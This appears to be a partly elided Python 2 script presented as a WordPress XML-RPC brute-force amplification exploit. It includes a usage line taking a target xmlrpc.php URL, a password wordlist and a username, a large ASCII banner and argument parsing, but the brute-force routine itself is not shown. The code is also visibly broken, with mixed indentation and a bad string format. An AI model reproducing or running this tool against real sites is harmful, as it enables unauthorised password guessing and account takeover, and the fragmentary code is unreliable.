#!/usr/bin/python
# Wordpress XML-RPC Brute Force Amplification Exploit by ANCIENT  ONE
# 
# THANKS TO IN3
#
...
#
# USAGE: ./wp-xml-brute-v1 http://target.com/xmlrpc.php passwords.txt username
#
...
def main(argv):
	...
	if argc < 3:
		...
		print bcolors.OKBLUE + "     __    _   _   ___  _______  ____/ _   _  _________    ____   _   _  _____/||" + bcolors.ENDC
		print bcolors.OKBLUE + "    /  \  | \ | | / __||__  ___||____ | \ | ||___   ___|  | ___ || \ | ||_____ ||" + bcolors.ENDC
		print bcolors.OKBLUE + "   //__\\ |  \| |/ |      | |    ____||  \| |    | |      ||   |||  \| | ____/ ||" + bcolors.ENDC
		print bcolors.OKBLUE + "  / ____ \| |\  |\ |__  __| |__ |____ | |\  |    | |      ||___||| |\  ||____  ||" + bcolors.ENDC
		print bcolors.OKBLUE + "  \/    \/|_| \_| \___||_______|____/ |_| \_|    |_|      |_____||_| \_| ___/  ||" + bcolors.ENDC
		print bcolors.OKBLUE + "================================================================================" + bcolors.ENDC
		...
		print bcolors.OKBLUE + "================================================================================" + bcolors.ENDC
		print ""
		print bcolors.OKBLUE + "TOOLS xmlrpc brute by ANCIENT ONE" + bcolors.ENDC
        	print bcolors.OKBLUE + "THANKS TO 1N3" % (argv[0]) + bcolors.ENDC
        	sys.exit(0)

	url = argv[1] # SET TARGET
	wordlist = argv[2] # SET CUSTOM WORDLIST
	users = argv[3] # SET USERNAME TO BRUTE FORCE
	# users = ['flipkey'] # USERS LIST, ADD MORE AS NEEDED OR CHANGE DEFAULT AD
	print ""
	print bcolors.OKBLUE + "TOOLS xmlrpc brute by ANCIIENT ONE" + bcolors.ENDC
